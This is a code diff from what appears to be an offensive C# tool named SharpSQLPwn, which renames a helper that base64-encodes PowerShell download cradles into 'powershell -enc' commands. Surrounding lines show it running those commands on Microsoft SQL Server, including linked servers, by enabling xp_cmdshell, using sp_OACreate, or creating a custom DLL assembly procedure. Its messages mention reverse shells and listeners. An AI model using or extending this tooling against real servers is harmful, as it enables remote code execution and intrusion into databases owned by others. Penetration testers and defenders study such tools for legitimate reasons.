@@ -159,22 +159,22 @@ namespace SharpSQLPwn
 
         }
 
-        static string EncodePsShellcode(String PS_cradle)
+        static string EncodePs(String PS_cradle)
         {
             String code = PS_cradle.Replace("\"", "");
 
             var psCommandBytes = System.Text.Encoding.Unicode.GetBytes(code);
             var psCommandBase64 = Convert.ToBase64String(psCommandBytes);
 
-            String shellcodecmd = "powershell -enc " + psCommandBase64;
+            String pscmd = "powershell -enc " + psCommandBase64;
 
             Console.WriteLine("\n[Info] The PS code: " + code);
-            Console.WriteLine("[Info] Encoded command: " + shellcodecmd);
+            Console.WriteLine("[Info] Encoded command: " + pscmd);
             Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine("[*] Executing Shellcode. Please make sure listener is running");
+            Console.WriteLine("[*] Executing command. If executing a reverse shell, please make sure listener is running");
             Console.ResetColor();
 
-            return shellcodecmd;
+            return pscmd;
         }
 
         static void Recon(SqlConnection con)
@@ -257,7 +257,7 @@ namespace SharpSQLPwn
 
                 if (cmdExec_tech == 1)
                 {
-                    String cmd = EncodePsShellcode(cmdExec_command);
+                    String cmd = EncodePs(cmdExec_command);
 
                     Console.ForegroundColor = ConsoleColor.Blue;
                     Console.WriteLine("[*] Trying technique-1 by enabling xp_cmdshell procedure if disabled ...");
@@ -275,7 +275,7 @@ namespace SharpSQLPwn
 
                 if (cmdExec_tech == 2)
                 {
-                    String cmd = EncodePsShellcode(cmdExec_command);
+                    String cmd = EncodePs(cmdExec_command);
 
                     Console.ForegroundColor = ConsoleColor.Blue;
                     Console.WriteLine("[*] Trying technique-2 by enabling sp_OACreate procedure if disabled ...");
@@ -291,7 +291,7 @@ namespace SharpSQLPwn
 
                 if (cmdExec_tech == 3)
                 {
-                    String cmd = EncodePsShellcode(cmdExec_command);
+                    String cmd = EncodePs(cmdExec_command);
 
                     Console.ForegroundColor = ConsoleColor.Blue;
                     Console.WriteLine("[*] Trying technique-3 by creating dll assembly and a custom procedure ...");
@@ -383,7 +383,7 @@ namespace SharpSQLPwn
 
             if (cmdExeclinked != "")
             {
-                String cmd = EncodePsShellcode(cmdExeclinked);
+                String cmd = EncodePs(cmdExeclinked);
 
                 string enableoption = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + linkedSQLServer + "]";
                 QuerySQL(con, enableoption, false);
